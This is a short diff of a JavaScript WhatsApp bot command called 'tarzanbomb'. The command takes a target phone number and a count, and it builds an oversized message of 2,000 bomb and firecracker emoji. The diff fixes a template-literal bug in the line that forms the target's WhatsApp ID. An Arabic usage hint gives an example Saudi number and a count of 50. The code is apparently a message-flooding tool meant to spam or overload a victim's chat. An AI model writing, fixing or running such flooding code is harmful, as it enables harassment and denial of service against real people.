@@ -5,7 +5,7 @@ const parts = text.trim().split(/\s+/); const number = parts[1]; const count = p
 
 if (!number || isNaN(number)) { return reply("❌ يرجى كتابة رقم الهاتف بعد الأمر.\nمثال: tarzanbomb 966xxxxxxxx 50"); }
 
-const jid = ${number}@s.whatsapp.net; const delay = (ms) => new Promise((res) => setTimeout(res, ms));
+const jid = `${number}@s.whatsapp.net`; const delay = (ms) => new Promise((res) => setTimeout(res, ms));
 
 const bigText = "💣".repeat(1000) + "\n🧨".repeat(1000);
 
